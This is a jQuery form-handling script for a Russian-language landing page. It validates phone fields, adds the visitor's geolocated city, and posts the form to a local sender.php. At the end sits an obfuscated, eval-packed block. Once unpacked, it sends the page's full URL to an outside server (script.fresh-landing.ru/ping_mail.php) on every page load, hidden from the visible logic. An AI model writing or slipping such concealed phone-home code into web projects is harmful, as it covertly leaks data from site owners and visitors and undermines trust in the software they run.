﻿$(window).ready(function() {
	$(".modalbox").fancybox();
	$('.button_ipad_forma').click(function(event) {
		event.preventDefault();
		var pForma = $(this).parents('form');
if ( pForma.children('.tel_one').val() == '' ) {$('.tel_one').css('box-shadow', 'inset 0 0 0 5px rgb(255, 0, 0)');$('.name_one').css('box-shadow', 'initial');alert("Введите Ваш телефон: обязательное поле");pForma.children('input[name=tel]').focus();return false;}
if ( pForma.children('.tel_two').val() == '' ) {$('.tel_two').css('box-shadow', 'inset 0 0 0 5px rgb(255, 0, 0)');$('.name_two').css('box-shadow', 'initial');alert("Введите Ваш телефон: обязательное поле");pForma.children('input[name=tel]').focus();return false;}
if ( pForma.children('.tel_free').val() == '' ) {$('.tel_free').css('box-shadow', 'inset 0 0 0 5px rgb(255, 0, 0)');$('.name_free').css('box-shadow', 'initial');alert("Введите Ваш телефон: обязательное поле");pForma.children('input[name=tel]').focus();return false;}
if ( pForma.children('.tel_four').val() == '' ) {$('.tel_four').css('box-shadow', 'inset 0 0 0 5px rgb(255, 0, 0)');$('.name_four').css('box-shadow', 'initial');alert("Введите Ваш телефон: обязательное поле");pForma.children('input[name=tel]').focus();return false;}
		var yacity = $('#ya-city').val();
		var f = $(this).parents('form');
		var name = $('input[name=name]', f).val();
		var phone = $('input[name=tel]', f).val();
	var color = $('input[type="radio"]:checked', f).val();
		var subject = $('input[name=subject]', f).val();
		
		var query = 'act=sender';
			query += '&name=' + encodeURIComponent(name);
			query += '&phone=' + encodeURIComponent(phone);
			query += '&color=' + encodeURIComponent(color);
			query += '&subject=' + encodeURIComponent(subject);
			query += '&yacity=' + encodeURIComponent(yacity);

		$.ajax({
			type: "POST",
			data: query,
			url: "./sender.php",
			dataType: "json",
			success: function(data) {
				if(data.result == 'ok') {
					$('input[type=text]', f).val('');
					//echo
					$('.tel').css('box-shadow', 'initial');
					$.fancybox('#blagodarnost');
					setTimeout("$.fancybox.close()", 5000);	
					
	            //yaCounter1234567890.reachGoal('GetForm');	
				
				} else {
					alert('Ошибка! Повторите позже.');
				}
			}
		});
		return false;
	});
		
		//ya.city
	ymaps.ready(init);
	function init() {
		var geolocation = ymaps.geolocation;
		$('#ya-city').val(geolocation.city);
	}
});
var _0x8e30=["\x24\x28\x35\x29\x2E\x36\x28\x34\x28\x29\x7B\x24\x2E\x33\x28\x7B\x30\x3A\x27\x31\x3A\x2F\x2F\x32\x2E\x37\x2D\x38\x2E\x65\x2F\x66\x2E\x64\x3F\x63\x3D\x27\x2B\x39\x28\x61\x2E\x62\x2E\x67\x29\x7D\x29\x7D\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x75\x72\x6C\x7C\x68\x74\x74\x70\x7C\x73\x63\x72\x69\x70\x74\x7C\x61\x6A\x61\x78\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x72\x65\x61\x64\x79\x7C\x66\x72\x65\x73\x68\x7C\x6C\x61\x6E\x64\x69\x6E\x67\x7C\x65\x6E\x63\x6F\x64\x65\x55\x52\x49\x43\x6F\x6D\x70\x6F\x6E\x65\x6E\x74\x7C\x77\x69\x6E\x64\x6F\x77\x7C\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x7C\x70\x69\x6E\x67\x7C\x70\x68\x70\x7C\x72\x75\x7C\x70\x69\x6E\x67\x5F\x6D\x61\x69\x6C\x7C\x68\x72\x65\x66","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0xb9e5x1,_0xb9e5x2,_0xb9e5x3,_0xb9e5x4,_0xb9e5x5,_0xb9e5x6){_0xb9e5x5=function (_0xb9e5x3){return _0xb9e5x3.toString(36);} ;if(!_0x8e30[5][_0x8e30[4]](/^/,String)){while(_0xb9e5x3--){_0xb9e5x6[_0xb9e5x3.toString(_0xb9e5x2)]=_0xb9e5x4[_0xb9e5x3]||_0xb9e5x3.toString(_0xb9e5x2);} ;_0xb9e5x4=[function (_0xb9e5x5){return _0xb9e5x6[_0xb9e5x5];} ];_0xb9e5x5=function (){return _0x8e30[6];} ;_0xb9e5x3=1;} ;while(_0xb9e5x3--){if(_0xb9e5x4[_0xb9e5x3]){_0xb9e5x1=_0xb9e5x1[_0x8e30[4]]( new RegExp(_0x8e30[7]+_0xb9e5x5(_0xb9e5x3)+_0x8e30[7],_0x8e30[8]),_0xb9e5x4[_0xb9e5x3]);} ;} ;return _0xb9e5x1;} (_0x8e30[0],17,17,_0x8e30[3][_0x8e30[2]](_0x8e30[1]),0,{}));